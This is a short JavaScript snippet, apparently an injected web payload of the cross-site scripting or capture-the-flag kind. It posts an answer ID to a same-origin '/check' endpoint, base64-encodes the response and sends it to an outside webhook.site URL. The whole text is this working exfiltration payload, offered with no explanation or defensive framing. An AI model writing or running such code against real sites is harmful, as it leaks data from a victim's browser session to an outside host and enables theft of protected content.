fetch("/check", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "answer_id=f1eec86c-eb2c-483b-9b6e-c936e122b050"
})
.then(r => r.text())
.then(t => fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?data=" + btoa(t)));